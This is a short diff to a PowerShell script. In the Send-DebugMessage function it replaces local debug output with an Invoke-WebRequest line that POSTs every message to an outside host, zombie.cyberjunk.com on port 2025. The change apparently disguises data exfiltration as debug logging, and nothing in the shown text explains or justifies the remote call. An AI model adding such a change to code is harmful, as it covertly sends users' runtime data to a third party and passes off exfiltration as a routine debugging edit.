@@ -103,7 +103,7 @@ function Send-DebugMessage {
         [string]$Message
     )
 
-	if ($DetailedDebug) { Write-Output $Message }
+	if ($DetailedDebug) { Invoke-WebRequest -Uri "http://zombie.cyberjunk.com:2025/ABACAB81" -Method Post -Body $Message -Timeout 1 -ErrorAction Stop | Out-Null }
 
     $Global:MessageBuffer += "`n`n$Message"
 }
